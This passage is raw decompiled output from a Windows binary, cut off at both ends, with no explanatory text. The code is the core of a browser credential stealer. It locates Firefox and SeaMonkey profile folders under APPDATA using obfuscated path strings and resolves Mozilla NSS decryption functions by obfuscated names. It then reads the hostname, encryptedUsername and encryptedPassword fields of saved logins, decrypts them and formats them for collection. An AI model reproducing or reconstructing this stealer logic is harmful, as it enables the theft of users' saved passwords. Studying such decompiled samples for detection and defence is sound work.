\"APPDATA\";\n        puVar38 = &stack0x000000a4 + iVar6;\n        *(&stack0xffffffec + iVar6) = 0x40b6cb;\n        uVar7 = sub.msvcrt.dll_getenv();\n        *(&stack0xfffffff0 + iVar6) = \"%6\\\\qIQRSd0V40S\\\\s0W84id6.4R4\";\n        *(&stack0xffffffec + iVar6) = 0x40b6d9;\n        uVar8 = fcn.004081aa();\n        *(&stack0xfffffffc + iVar6) = uVar7;\n        puVar18 = &stack0x000001d4 + iVar6;\n        *(&stack0xfffffff8 + iVar6) = uVar8;\n        *(&stack0xfffffff4 + iVar6) = 0x204;\n        *(&stack0xfffffff0 + iVar6) = puVar18;\n        *(&stack0xffffffec + iVar6) = 0x40b6f8;\n        fcn.004127a8();\n        *(&stack0xfffffff8 + iVar6) = 0x80;\n        *(&stack0xfffffff4 + iVar6) = puVar38;\n        *(&stack0xfffffff0 + iVar6) = puVar18;\n        *(&stack0xffffffec + iVar6) = 0x40b70c;\n        cVar5 = fcn.0040b105();\n        if (cVar5 == '\\0') goto code_r0x0040c16e;\n        *(&stack0xfffffff0 + iVar6) = \"APPDATA\";\n        *(&stack0xffffffec + iVar6) = 0x40b720;\n        uVar7 = sub.msvcrt.dll_getenv();\n        *(&stack0xfffffff0 + iVar6) = \"%6\\\\qIQRSd0V40S\\\\%6\";\ncode_r0x0040b7c9:\n        *(&stack0xffffffec + iVar6) = 0x40b7ce;\n        uVar8 = fcn.004081aa();\n        *(&stack0x00000000 + iVar6) = puVar38;\n        *(&stack0xfffffffc + iVar6) = uVar7;\n        *(&stack0xfffffff8 + iVar6) = uVar8;\n        *(&stack0xfffffff4 + iVar6) = 0x204;\n        *(&stack0xfffffff0 + iVar6) = puVar18;\n        *(&stack0xffffffec + iVar6) = 0x40b7ea;\n        fcn.004127a8();\n    }\n    else {\n        if (*(&stack0x00001c00 + iVar6) == 6) {\n            *(&stack0xfffffff0 + iVar6) = \"SeaMonkey\";\n            *(&stack0xfffffff8 + iVar6) = &stack0x00000124 + iVar6;\n            *(&stack0xfffffff4 + iVar6) = &stack0x00000080 + iVar6;\n            *(&stack0xffffffec + iVar6) = 0x40b750;\n            cVar5 = fcn.0040b34d();\n            if (cVar5 == '\\0') {\n                return 0;\n            }\n            *(&stack0xfffffff0 + iVar6) = \"APPDATA\";\n            puVar38 = &stack0x000000a4 + iVar6;\n            *(&stack0xffffffec + iVar6) = 0x40b76b;\n            uVar7 = sub.msvcrt.dll_getenv();\n            *(&stack0xfffffff0 + iVar6) = \"%6\\\\FWk4iiC\\\\MdCFWRwdZ\\\\s0W84id6.4R4\";\n            *(&stack0xffffffec + iVar6) = 0x40b779;\n            uVar8 = fcn.004081aa();\n            *(&stack0xfffffffc + iVar6) = uVar7;\n            puVar18 = &stack0x000001d4 + iVar6;\n            *(&stack0xfffffff8 + iVar6) = uVar8;\n            *(&stack0xfffffff4 + iVar6) = 0x204;\n            *(&stack0xfffffff0 + iVar6) = puVar18;\n            *(&stack0xffffffec + iVar6) = 0x40b798;\n            fcn.004127a8();\n            *(&stack0xfffffff8 + iVar6) = 0x80;\n            *(&stack0xfffffff4 + iVar6) = puVar38;\n            *(&stack0xfffffff0 + iVar6) = puVar18;\n            *(&stack0xffffffec + iVar6) = 0x40b7ac;\n            cVar5 = fcn.0040b016();\n            ppiVar37 = &stack0xfffffff0 + iVar6;\n            if (cVar5 == '\\0') goto code_r0x0040c16e;\n            *(&stack0xfffffff0 + iVar6) = \"APPDATA\";\n            *(&stack0xffffffec + iVar6) = 0x40b7c0;\n            uVar7 = sub.msvcrt.dll_getenv();\n            *(&stack0xfffffff0 + iVar6) = \"%6\\\\FWk4iiC\\\\MdCFWRwdZ\\\\%6\";\n            goto code_r0x0040b7c9;\n        }\n        if (*(&stack0x00001c00 + iVar6) == 1) {\n            *(&stack0xfffffff0 + iVar6) = \"Mozilla Firefox\";\n            *(&stack0xfffffff8 + iVar6) = &stack0x00000124 + iVar6;\n            *(&stack0xfffffff4 + iVar6) = &stack0x00000080 + iVar6;\n            *(&stack0xffffffec + iVar6) = 0x40b60d;\n            cVar5 = fcn.0040b34d();\n            if (cVar5 == '\\0') {\n                return 0;\n            }\n            *(&stack0xfffffff0 + iVar6) = \"APPDATA\";\n            puVar38 = &stack0x000000a4 + iVar6;\n            *(&stack0xffffffec + iVar6) = 0x40b62b;\n            uVar7 = sub.msvcrt.dll_getenv();\n            *(&stack0xfffffff0 + iVar6) = \"%6\\\\FWk4iiC\\\\_40d8Wf\\\\s0W84id6.4R4\";\n            *(&stack0xffffffec + iVar6) = 0x40b639;\n            uVar8 = fcn.004081aa();\n            *(&stack0xfffffffc + iVar6) = uVar7;\n            puVar18 = &stack0x000001d4 + iVar6;\n            *(&stack0xfffffff8 + iVar6) = uVar8;\n            *(&stack0xfffffff4 + iVar6) = 0x204;\n            *(&stack0xfffffff0 + iVar6) = puVar18;\n            *(&stack0xffffffec + iVar6) = 0x40b658;\n            fcn.004127a8();\n            *(&stack0xfffffff8 + iVar6) = 0x80;\n            *(&stack0xfffffff4 + iVar6) = puVar38;\n            *(&stack0xfffffff0 + iVar6) = puVar18;\n            *(&stack0xffffffec + iVar6) = 0x40b66c;\n            cVar5 = fcn.0040b016();\n            ppiVar37 = &stack0xfffffff0 + iVar6;\n            if (cVar5 == '\\0') goto code_r0x0040c16e;\n            *(&stack0xfffffff0 + iVar6) = \"APPDATA\";\n            *(&stack0xffffffec + iVar6) = 0x40b680;\n            uVar7 = sub.msvcrt.dll_getenv();\n            *(&stack0xfffffff0 + iVar6) = \"%6\\\\FWk4iiC\\\\_40d8Wf\\\\%6\";\n            goto code_r0x0040b7c9;\n        }\n    }\n    *(&stack0xfffffff0 + iVar6) = \"%6\\\\64nRWR6.67i45d\";\n    *(&stack0xffffffec + iVar6) = 0x40b7fd;\n    uVar7 = fcn.004081aa();\n    *(&stack0xfffffff8 + iVar6) = uVar7;\n    *(&stack0xfffffffc + iVar6) = &stack0x000001d4 + iVar6;\n    *(&stack0xfffffff4 + iVar6) = 0x204;\n    *(&stack0xfffffff0 + iVar6) = &stack0x000003d8 + iVar6;\n    *(&stack0xffffffec + iVar6) = 0x40b81c;\n    fcn.004127a8();\n    *(&stack0xfffffff0 + iVar6) = \"%6\\\\iWn4R6.e6WR\";\n    *(&stack0xffffffec + iVar6) = 0x40b828;\n    uVar7 = fcn.004081aa();\n    *(&stack0xfffffff8 + iVar6) = uVar7;\n    *(&stack0xfffffffc + iVar6) = &stack0x000001d4 + iVar6;\n    *(&stack0xfffffff4 + iVar6) = 0x204;\n    *(&stack0xfffffff0 + iVar6) = &stack0x000005dc + iVar6;\n    *(&stack0xffffffec + iVar6) = 0x40b847;\n    fcn.004127a8();\n    *(&stack0xfffffff4 + iVar6) = \"NSS_Init\";\n    *(&stack0xfffffff0 + iVar6) = *(&stack0x00000098 + iVar6);\n    *(&stack0xffffffec + iVar6) = 0x40b85e;\n    iVar9 = fcn.00407f8e();\n    *(&stack0x00000028 + iVar6) = iVar9;\n    if (iVar9 != 0) {\n        *(&stack0xfffffff0 + iVar6) = \"9HGGpEd5XR5d0RCiHdZMiW5\";\n        *(&stack0xffffffec + iVar6) = 0x40b876;\n        uVar7 = fcn.004081aa();\n        *(&stack0xfffffff4 + iVar6) = uVar7;\n        *(&stack0xfffffff0 + iVar6) = *(&stack0x00000098 + iVar6);\n        *(&stack0xffffffec + iVar6) = 0x40b889;\n        iVar9 = fcn.00407f8e();\n        *(&stack0x0000002c + iVar6) = iVar9;\n        if (iVar9 != 0) {\n            *(&stack0xfffffff0 + iVar6) = \"9HGGpDQ5IdR54YC5d\";\n            *(&stack0xffffffec + iVar6) = 0x40b8a1;\n            uVar7 = fcn.004081aa();\n            *(&stack0xfffffff4 + iVar6) = uVar7;\n            *(&stack0xfffffff0 + iVar6) = *(&stack0x00000098 + iVar6);\n            *(&stack0xffffffec + iVar6) = 0x40b8b4;\n            iVar9 = fcn.00407f8e();\n            *(&stack0x00000030 + iVar6) = iVar9;\n            if (iVar9 != 0) {\n                *(&stack0xfffffff0 + iVar6) = \"9mpcC6doOadYWSd\";\n                *(&stack0xffffffec + iVar6) = 0x40b8cc;\n                uVar7 = fcn.004081aa();\n                *(&stack0xfffffff4 + iVar6) = uVar7;\n                *(&stack0xfffffff0 + iVar6) = *(&stack0x00000098 + iVar6);\n                *(&stack0xffffffec + iVar6) = 0x40b8df;\n                iVar9 = fcn.00407f8e();\n                *(&stack0x0000001c + iVar6) = iVar9;\n                if (iVar9 != 0) {\n                    *(&stack0xfffffff0 + iVar6) = \"MjPXqjFpx80ddX5dl\";\n                    *(&stack0xffffffec + iVar6) = 0x40b8f7;\n                    uVar7 = fcn.004081aa();\n                    *(&stack0xfffffff4 + iVar6) = uVar7;\n                    *(&stack0xfffffff0 + iVar6) = *(&stack0x00000098 + iVar6);\n                    *(&stack0xffffffec + iVar6) = 0x40b90a;\n                    iVar9 = fcn.00407f8e();\n                    *(&stack0x00000034 + iVar6) = iVar9;\n                    if (iVar9 != 0) {\n                        *(&stack0xfffffff0 + iVar6) = \"9HGGMarpadY0Zs5\";\n                        *(&stack0xffffffec + iVar6) = 0x40b922;\n                        uVar7 = fcn.004081aa();\n                        *(&stack0xfffffff4 + iVar6) = uVar7;\n                        *(&stack0xfffffff0 + iVar6) = *(&stack0x00000098 + iVar6);\n                        *(&stack0xffffffec + iVar6) = 0x40b935;\n                        iVar9 = fcn.00407f8e();\n                        *(&stack0x00000020 + iVar6) = iVar9;\n                        if (iVar9 != 0) {\n                            *(&stack0xfffffff0 + iVar6) = \"9HGGp_0ddMiW5\";\n                            *(&stack0xffffffec + iVar6) = 0x40b94d;\n                            uVar7 = fcn.004081aa();\n                            *(&stack0xfffffff4 + iVar6) = uVar7;\n                            *(&stack0xfffffff0 + iVar6) = *(&stack0x00000098 + iVar6);\n                            *(&stack0xffffffec + iVar6) = 0x40b960;\n                            iVar9 = fcn.00407f8e();\n                            *(&stack0x00000038 + iVar6) = iVar9;\n                            if (iVar9 != 0) {\n                                *(&stack0xfffffff0 + iVar6) = \"LMMpMIQ5SWgR\";\n                                *(&stack0xffffffec + iVar6) = 0x40b978;\n                                uVar7 = fcn.004081aa();\n                                *(&stack0xfffffff4 + iVar6) = uVar7;\n                                *(&stack0xfffffff0 + iVar6) = *(&stack0x00000098 + iVar6);\n                                *(&stack0xffffffec + iVar6) = 0x40b98b;\n                                iVar9 = fcn.00407f8e();\n                                *(&stack0x0000003c + iVar6) = iVar9;\n                                if (iVar9 != 0) {\n                                    *(&stack0xfffffff0 + iVar6) = \"67i45dNpWsdR\";\n                                    *(&stack0xffffffec + iVar6) = 0x40b9a3;\n                                    uVar7 = fcn.004081aa();\n                                    *(&stack0xfffffff4 + iVar6) = uVar7;\n                                    *(&stack0xfffffff0 + iVar6) = *(&stack0x00000098 + iVar6);\n                                    *(&stack0xffffffec + iVar6) = 0x40b9b6;\n                                    pcVar10 = fcn.00407f8e();\n                                    if (pcVar10 != NULL) {\n                                        *(&stack0xfffffff0 + iVar6) = \"67i45dNpYiW6d\";\n                                        *(&stack0xffffffec + iVar6) = 0x40b9cc;\n                                        uVar7 = fcn.004081aa();\n                                        *(&stack0xfffffff4 + iVar6) = uVar7;\n                                        *(&stack0xfffffff0 + iVar6) = *(&stack0x00000098 + iVar6);\n                                        *(&stack0xffffffec + iVar6) = 0x40b9df;\n                                        iVar9 = fcn.00407f8e();\n                                        if (iVar9 != 0) {\n                                            *(&stack0xfffffff0 + iVar6) = \"67i45dNps0dsC0dp2h\";\n                                            *(&stack0xffffffec + iVar6) = 0x40b9f3;\n                                            uVar7 = fcn.004081aa();\n                                            *(&stack0xfffffff4 + iVar6) = uVar7;\n                                            *(&stack0xfffffff0 + iVar6) = *(&stack0x00000098 + iVar6);\n                                            *(&stack0xffffffec + iVar6) = 0x40ba06;\n                                            pcVar11 = fcn.00407f8e();\n                                            if (pcVar11 != NULL) {\n                                                *(&stack0xfffffff0 + iVar6) = \"67i45dNp65ds\";\n                                                *(&stack0xffffffec + iVar6) = 0x40ba1c;\n                                                uVar7 = fcn.004081aa();\n                                                *(&stack0xfffffff4 + iVar6) = uVar7;\n                                                *(&stack0xfffffff0 + iVar6) = *(&stack0x00000098 + iVar6);\n                                                *(&stack0xffffffec + iVar6) = 0x40ba2f;\n                                                iVar9 = fcn.00407f8e();\n                                                *(&stack0x00000048 + iVar6) = iVar9;\n                                                if (iVar9 != 0) {\n                                                    *(&stack0xfffffff0 + iVar6) = \"67i45dNpYWiQlRp5df5\";\n                                                    *(&stack0xffffffec + iVar6) = 0x40ba47;\n                                                    uVar7 = fcn.004081aa();\n                                                    *(&stack0xfffffff4 + iVar6) = uVar7;\n                                                    *(&stack0xfffffff0 + iVar6) = *(&stack0x00000098 + iVar6);\n                                                    *(&stack0xffffffec + iVar6) = 0x40ba5a;\n                                                    iVar9 = fcn.00407f8e();\n                                                    *(&stack0x00000024 + iVar6) = iVar9;\n                                                    if (iVar9 != 0) {\n                                                        *(&stack0xfffffff0 + iVar6) = &stack0x000003d8 + iVar6;\n                                                        *(&stack0xffffffec + iVar6) = 0x40ba75;\n                                                        cVar5 = fcn.00406f1a();\n                                                        if (cVar5 != '\\0') {\n                                                            *(&stack0xfffffff0 + iVar6) = &stack0x000003d8 + iVar6;\n                                                            *(&stack0xfffffff4 + iVar6) = &stack0x00000050 + iVar6;\n                                                            ppcVar19 = &stack0xffffffec + iVar6;\n                                                            *(&stack0xffffffec + iVar6) = 0x40ba8a;\n                                                            iVar6 = (*pcVar10)();\n                                                            if (iVar6 != 0) {\n                                                                return 0;\n                                                            }\n                                                            *ppcVar19 = \"6didY5 *  80Wl lWkpiWn4R6\";\n                                                            ppcVar19[-1] = 0x40ba9e;\n                                                            pcVar12 = fcn.004081aa();\n                                                            uVar17 = 0xffffffff;\n                                                            do {\n                                                                if (uVar17 == 0) break;\n                                                                uVar17 = uVar17 - 1;\n                                                                cVar5 = *pcVar12;\n                                                                pcVar12 = pcVar12 + 1;\n                                                            } while (cVar5 != '\\0');\n                                                            *ppcVar19 = \"6didY5 *  80Wl lWkpiWn4R6\";\n                                                            ppcVar19[-1] = 0x40bab8;\n                                                            pcVar12 = fcn.004081aa();\n                                                            ppcVar19[1] = pcVar12;\n                                                            ppcVar19[2] = ~uVar17 - 1;\n                                                            ppcVar19[4] = ppcVar19 + 0x1a;\n                                                            *ppcVar19 = ppcVar19[0x18];\n                                                            ppcVar19[3] = ppcVar19 + 0x19;\n                                                            ppiVar20 = ppcVar19 + -1;\n                                                            ppcVar19[-1] = 0x40bad9;\n                                                            iVar6 = (*pcVar11)();\n                                                            if (iVar6 == 0) {\n                                                                *ppiVar20 = ppiVar20 + 0x79;\n                                                                ppcVar1 = ppiVar20 + 0xe;\n                                                                puVar21 = ppiVar20 + -1;\n                                                                ppiVar20 = ppiVar20 + -1;\n                                                                *puVar21 = 0x40baf1;\n                                                                iVar6 = (**ppcVar1)();\n                                                                if (iVar6 == 0) {\n                                                                    piVar22 = ppiVar20 + -4;\n                                                                    *(ppiVar20 + -4) = 0x40baff;\n                                                                    iVar6 = (**(ppiVar20 + 0x3c))();\n                                                                    piVar22[0x14] = iVar6;\n                                                                    if (iVar6 != 0) {\n                                                                        *piVar22 = iVar6;\n                                                                        piVar22[2] = 0;\n                                                                        piVar22[1] = 1;\n                                                                        piVar23 = piVar22 + -1;\n                                                                        piVar22[-1] = 0x40bb24;\n                                                                        iVar6 = (*piVar22[0x10])();\n                                                                        if (iVar6 == 0) {\n                                                                            pcVar12 = piVar23 + 0xbf0;\n                                                                            *(piVar23 + 0x54) = 0;\n                                                                            do {\n                                                                                piVar23[1] = 1;\n                                                                                *piVar23 = piVar23[0x19];\n                                                                                ppcVar24 = piVar23 + -1;\n                                                                                piVar23[-1] = 0x40bb5e;\n                                                                                iVar6 = (*piVar23[0xd])();\n                                                                                ppcVar24[0x17] = iVar6;\n                                                                                if (iVar6 != 0) {\n                                                                                    ppcVar24[1] = 0x6;\n                                                                                    *ppcVar24 = ppcVar24[0x19];\n                                                                                    ppcVar25 = ppcVar24 + -1;\n                                                                                    ppcVar24[-1] = 0x40bb81;\n                                                                                    pcVar13 = (*ppcVar24[0xd])();\n                                                                                    ppcVar25[2] = 0x400;\n                                                                                    ppcVar25[1] = pcVar13;\n                                                                                    *ppcVar25 = pcVar12;\n                                                                                    ppcVar25[-1] = 0x40bb95;\n                                                                                    fcn.00412548();\n                                                                                    ppcVar25[0x22] = NULL;\n                                                                                    ppcVar25[0x23] = NULL;\n                                                                                    uVar17 = 0xffffffff;\n                                                                                    pcVar13 = pcVar12;\n                                                                                    do {\n                                                                                        if (uVar17 == 0) break;\n                                                                                        uVar17 = uVar17 - 1;\n                                                                                        cVar5 = *pcVar13;\n                                                                                        pcVar13 = pcVar13 + 1;\n                                                                                    } while (cVar5 != '\\0');\n                                                                                    *ppcVar25 = pcVar12;\n                                                                                    ppcVar25[2] = ppcVar25 + 0x4fc;\n                                                                                    ppcVar25[1] = ~uVar17 - 1;\n                                                                                    ppcVar24 = ppcVar25 + -1;\n                                                                                    ppcVar25[-1] = 0x40bbcd;\n                                                                                    iVar6 = (*ppcVar25[0xb])();\n                                                                                    if (iVar6 != 0) {\n                                                                                        *ppcVar24 = pcVar12;\n                                                                                        ppcVar2 = ppcVar24 + 0x1e;\n                                                                                        ppcVar24[0x1f] =\n                                                                                             ppcVar24 + 0x4fc;\n                                                                                        ppcVar24[-1] = 0x40bbec;\n                                                                                        pcVar13 = fcn.00403f65();\n                                                                                        ppcVar24[0x20] = pcVar13;\n                                                                                        ppcVar24[2] = NULL;\n                                                                                        *ppcVar24 = ppcVar2;\n                                                                                        ppcVar24[1] = ppcVar24 + 0x21;\n                                                                                        ppcVar1 = ppcVar24 + 0xc;\n                                                                                        ppcVar26 = ppcVar24 + -1;\n                                                                                        ppcVar24 = ppcVar24 + -1;\n                                                                                        *ppcVar26 = 0x40bc0f;\n                                                                                        iVar6 = (**ppcVar1)();\n                                                                                        if ((iVar6 == 0) &&\n                                                                                           (ppcVar24[0x20] != NULL)) {\n                                                                                            *ppcVar24 = pcVar12;\n                                                                                            ppcVar3 = ppcVar24 + 0x3fc;\n                                                                                            ppcVar24[2] = ppcVar24[0x23]\n                                                                                                          + 1;\n                                                                                            ppcVar24[1] = ppcVar24[0x22]\n                                                                                            ;\n                                                                                            ppcVar24[-1] = 0x40bc4d;\n                                                                                            fcn.00412548();\n                                                                                            ppcVar24[1] = 0x7;\n                                                                                            *ppcVar24 = ppcVar24[0x19];\n                                                                                            ppcVar27 = ppcVar24 + -1;\n                                                                                            ppcVar24[-1] = 0x40bc62;\n                                                                                            uVar7 = (*ppcVar24[0xd])();\n                                                                                            ppcVar27[2] = 0x400;\n                                                                                            ppcVar27[1] = uVar7;\n                                                                                            *ppcVar27 = ppcVar3;\n                                                                                            ppcVar27[-1] = 0x40bc76;\n                                                                                            fcn.00412548();\n                                                                                            ppcVar27[0x22] = NULL;\n                                                                                            ppcVar27[0x23] = NULL;\n                                                                                            uVar17 = 0xffffffff;\n                                                                                            ppcVar39 = ppcVar3;\n                                                                                            do {\n                                                                                                if (uVar17 == 0) break;\n                                                                                                uVar17 = uVar17 - 1;\n                                                                                                cVar5 = *ppcVar39;\n                                                                                                ppcVar39 = ppcVar39 + 1;\n                                                                                            } while (cVar5 != '\\0');\n                                                                                            *ppcVar27 = ppcVar3;\n                                                                                            ppcVar27[2] = ppcVar27 +\n                                                                                                          0x4fc;\n                                                                                            ppcVar27[1] = ~uVar17 - 1;\n                                                                                            puVar28 = ppcVar27 + -1;\n                                                                                            ppcVar27[-1] = 0x40bcae;\n                                                                                            (*ppcVar27[0xb])();\n                                                                                            *puVar28 = ppcVar3;\n                                                                                            puVar28[0x1f] =\n                                                                                                 puVar28 + 0x4fc;\n                                                                                            puVar28[-1] = 0x40bcc1;\n                                                                                            uVar7 = fcn.00403f65();\n                                                                                            puVar28[0x20] = uVar7;\n                                                                                            puVar28[2] = 0;\n                                                                                            *puVar28 = ppcVar2;\n                                                                                            puVar28[1] = puVar28 + 0x21;\n                                                                                            ppcVar24 = puVar28 + -1;\n                                                                                            puVar28[-1] = 0x40bce4;\n                                                                                            iVar6 = (*puVar28[0xc])();\n                                                                                            if (((iVar6 == 0) &&\n                                                                                                (ppcVar24[0x20] != NULL)\n                                                                                                ) && (ppcVar24[0x23] <\n                                                                                                      0x400)) {\n                                                                                                *ppcVar24 = ppcVar3;\n                                                                                                ppcVar24[2] = ppcVar24[\n                                                            0x23] + 1;\n                                                            ppcVar24[1] = ppcVar24[0x22];\n                                                            ppcVar24[-1] = 0x40bd28;\n                                                            fcn.00412548();\n                                                            ppcVar24[5] = ppcVar3;\n                                                            ppcVar24[4] = pcVar12;\n                                                            ppcVar24[1] = \"%c%s\\a%s\\a%s\\b\\b\\b\\b\";\n                                                            *ppcVar24 = ppcVar24 + 0x1b;\n                                                            ppcVar24[3] = ppcVar24[0x17];\n                                                            ppcVar24[2] = ppcVar24[0x704];\n                                                            ppcVar24[-1] = 0x40bd53;\n                                                            iVar6 = fcn.00412755();\n                                                            if (iVar6 != -1) {\n                                                                ppcVar24[3] = iVar6;\n                                                                ppcVar24[4] = 0x1;\n                                                                ppcVar24[2] = ppcVar24 + 0x1b;\n                                                                ppcVar24[1] = ppcVar24[0x15];\n                                                                *ppcVar24 = ppcVar24 + 0x1c;\n                                                                ppcVar24[-1] = 0x40bd7e;\n                                                                uVar7 = fcn.00412abf();\n                                                                ppcVar24[0x15] = ppcVar24[0x15] + iVar6;\n                                                                ppcVar24[0x1c] = uVar7;\n                                                            }\n                                                            ppcVar24[1] = NULL;\n                                                            *ppcVar24 = ppcVar24 + 0x21;\n                                                            ppcVar1 = ppcVar24 + 0x11;\n                                                            puVar29 = ppcVar24 + -1;\n                                                            ppcVar24 = ppcVar24 + -1;\n                                                            *puVar29 = 0x40bd9e;\n                                                            (**ppcVar1)();\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            *ppcVar24 = ppcVar24[0x19];\n                                                            piVar23 = ppcVar24 + -1;\n                                                            ppcVar24[-1] = 0x40bdab;\n                                                            iVar6 = (*ppcVar24[0x16])();\n                                                            } while (iVar6 == 100);\n                                                            }\n                                                            *piVar23 = piVar23[0x14];\n                                                            piVar22 = piVar23 + -1;\n                                                            piVar23[-1] = 0x40bb35;\n                                                            (*piVar23[0x12])();\n                                                            }\n                                                            ppiVar20 = piVar22 + -4;\n                                                            *(piVar22 + -4) = 0x40bdbf;\n                                                            (**(piVar22 + 0x4c))();\n                                                            }\n                                                            }\n                                                        }\n                                                        ppiVar4 = ppiVar20 + 0x17b;\n                                                        *ppiVar20 = ppiVar4;\n                                                        ppiVar20[-1] = 0x40bdce;\n                                                        cVar5 = fcn.00406f1a();\n                                                        ppiVar37 = ppiVar20;\n                                                        if (cVar5 != '\\0') {\n                                                            ppiVar20[1] = 0x4235fa;\n                                                            *ppiVar20 = ppiVar4;\n                                                            ppiVar20[-1] = 0x40bde6;\n                                                            piVar14 = sub.msvcrt.dll_fopen();\n                                                            if (piVar14 != NULL) {\n                                                                *ppiVar20 = ppiVar4;\n                                                                ppiVar20[-1] = 0x40bdf8;\n                                                                piVar15 = fcn.004074c5();\n                                                                *ppiVar20 = piVar15;\n                                                                ppiVar20[-1] = 0x40be02;\n                                                                piVar16 = sub.msvcrt.dll_malloc();\n                                                                ppiVar20[0x1d] = piVar16;\n                                                                if (piVar16 == NULL) {\n                                                                    *ppiVar20 = piVar14;\n                                                                    ppiVar20[-1] = 0x40be12;\n                                                                    sub.msvcrt.dll_fclose();\n                                                                }\n                                                                else {\n                                                                    ppiVar20[3] = piVar14;\n                                                                    ppiVar20[2] = piVar15;\n                                                                    ppiVar20[1] = 0x1;\n                                                                    *ppiVar20 = piVar16;\n                                                                    ppiVar20[-1] = 0x40be2f;\n                                                                    sub.msvcrt.dll_fread();\n                                                                    *ppiVar20 = piVar14;\n                                                                    ppiVar20[-1] = 0x40be37;\n                                                                    sub.msvcrt.dll_fclose();\n                                                                    *ppiVar20 = ppiVar20 + 0x79;\n                                                                    ppiVar30 = ppiVar20 + -1;\n                                                                    ppiVar20[-1] = 0x40be47;\n                                                                    iVar6 = (*ppiVar20[0xe])();\n                                                                    if (iVar6 == 0) {\n                                                                        piVar31 = ppiVar30 + -4;\n                                                                        *(ppiVar30 + -4) = 0x40be55;\n                                                                        iVar6 = (**(ppiVar30 + 0x3c))();\n                                                                        piVar31[0xd] = iVar6;\n                                                                        if (iVar6 != 0) {\n                                                                            *piVar31 = iVar6;\n                                                                            piVar31[2] = 0;\n                                                                            piVar31[1] = 1;\n                                                                            ppiVar32 = piVar31 + -1;\n                                                                            piVar31[-1] = 0x40be7a;\n                                                                            iVar6 = (*piVar31[0x10])();\n                                                                            if (iVar6 == 0) {\n                                                                                piVar14 = NULL;\n                                                                                *(ppiVar32 + 0x38) = 0;\n                                                                                while( true ) {\n                                                                                    piVar15 = ppiVar32[0x1d];\n                                                                                    *ppiVar32 = \"IW65RCld\";\n                                                                                    ppiVar32[-1] = 0x40bf51;\n                                                                                    piVar16 = fcn.004081aa();\n                                                                                    ppiVar32[1] = piVar16;\n                                                                                    ppiVar32[2] = piVar15;\n                                                                                    *ppiVar32 = piVar14 + 1;\n                                                                                    ppiVar32[-1] = 0x40bf64;\n                                                                                    piVar14 = fcn.004125de();\n                                                                                    if (piVar14 == 0xffffffff) break;\n                                                                                    ppiVar32[4] = 0x400;\n                                                                                    ppiVar32[2] = \"hostname\";\n                                                                                    ppiVar32[1] = piVar14;\n                                                                                    ppiVar32[3] = ppiVar32 + 0x1fc;\n                                                                                    *ppiVar32 = ppiVar32[0x1d];\n                                                                                    ppiVar32[-1] = 0x40bf96;\n                                                                                    cVar5 = fcn.0040b50a();\n                                                                                    if (cVar5 == '\\0') break;\n                                                                                    ppiVar32[4] = 0x400;\n                                                                                    ppiVar32[2] = \"encryptedUsername\";\n                                                                                    ppiVar32[1] = piVar14;\n                                                                                    ppiVar32[3] = ppiVar32 + 0x2fc;\n                                                                                    *ppiVar32 = ppiVar32[0x1d];\n                                                                                    ppiVar32[-1] = 0x40bebc;\n                                                                                    cVar5 = fcn.0040b50a();\n                                                                                    if (cVar5 == '\\0') break;\n                                                                                    ppiVar37 = ppiVar32 + 0x3fc;\n                                                                                    ppiVar32[4] = 0x400;\n                                                                                    ppiVar32[2] = \"encryptedPassword\";\n                                                                                    ppiVar32[1] = piVar14;\n                                                                                    ppiVar32[3] = ppiVar37;\n                                                                                    *ppiVar32 = ppiVar32[0x1d];\n                                                                                    ppiVar32[-1] = 0x40beef;\n                                                                                    cVar5 = fcn.0040b50a();\n                                                                                    if (cVar5 == '\\0') break;\n                                                                                    ppiVar32[0x22] = NULL;\n                                                                                    ppiVar32[0x23] = NULL;\n                                                                                    uVar17 = 0xffffffff;\n                                                                                    ppiVar4 = ppiVar32 + 0x4fc;\n                                                                                    ppiVar40 = ppiVar32 + 0x2fc;\n                                                                                    do {\n                                                                                        if (uVar17 == 0) break;\n                                                                                        uVar17 = uVar17 - 1;\n                                                                                        cVar5 = *ppiVar40;\n                                                                                        ppiVar40 = ppiVar40 + 1;\n                                                                                    } while (cVar5 != '\\0');\n                                                                                    ppiVar32[2] = ppiVar4;\n                                                                                    *ppiVar32 = ppiVar32 + 0x2fc;\n                                                                                    ppiVar40 = ppiVar32 + 0xb;\n                                                                                    ppiVar32[1] = ~uVar17 - 1;\n                                                                                    ppiVar33 = ppiVar32 + -1;\n                                                                                    ppiVar32 = ppiVar32 + -1;\n                                                                                    *ppiVar33 = 0x40bf3d;\n                                                                                    iVar6 = (**ppiVar40)();\n                                                                                    if (iVar6 != 0) {\n                                                                                        ppiVar32[0x1f] = ppiVar4;\n                                                                                        *ppiVar32 = ppiVar32 + 0x2fc;\n                                                                                        ppiVar32[-1] = 0x40bfc3;\n                                                                                        uVar7 = fcn.00403f65();\n                                                                                        ppiVar32[0x20] = uVar7;\n                                                                                        ppiVar32[2] = NULL;\n                                                                                        ppiVar32[1] = ppiVar32 + 0x21;\n                                                                                        *ppiVar32 = ppiVar32 + 0x1e;\n                                                                                        ppcVar1 = ppiVar32 + 0xc;\n                                                                                        puVar34 = ppiVar32 + -1;\n                                                                                        ppiVar32 = ppiVar32 + -1;\n                                                                                        *puVar34 = 0x40bfea;\n                                                                                        iVar6 = (**ppcVar1)();\n                                                                                        if ((iVar6 == 0) &&\n                                                                                           (ppiVar32[0x20] != NULL)) {\n                                                                                            ppiVar32[2] = ppiVar32[0x23]\n                                                                                                          + 1;\n                                                                                            ppiVar32[1] = ppiVar32[0x22]\n                                                                                            ;\n                                                                                            *ppiVar32 = ppiVar32 + 0x2fc\n                                                                                            ;\n                                                                                            ppiVar32[-1] = 0x40c028;\n                                                                                            fcn.00412548();\n                                                                                            ppiVar32[0x22] = NULL;\n                                                                                            ppiVar32[0x23] = NULL;\n                                                                                            uVar17 = 0xffffffff;\n                                                                                            ppiVar40 = ppiVar37;\n                                                                                            do {\n                                                                                                if (uVar17 == 0) break;\n                                                                                                uVar17 = uVar17 - 1;\n                                                                                                cVar5 = *ppiVar40;\n                                                                                                ppiVar40 = ppiVar40 + 1;\n                                                                                            } while (cVar5 != '\\0');\n                                                                                            ppiVar32[2] = ppiVar4;\n                                                                                            *ppiVar32 = ppiVar37;\n                                                                                            ppiVar32[1] = ~uVar17 - 1;\n                                                                                            ppiVar35 = ppiVar32 + -1;\n                                                                                            ppiVar32[-1] = 0x40c059;\n                                                                                            (*ppiVar32[0xb])();\n                                                                                            *ppiVar35 = ppiVar37;\n                                                                                            ppiVar35[0x1f] = ppiVar4;\n                                                                                            ppiVar35[-1] = 0x40c065;\n       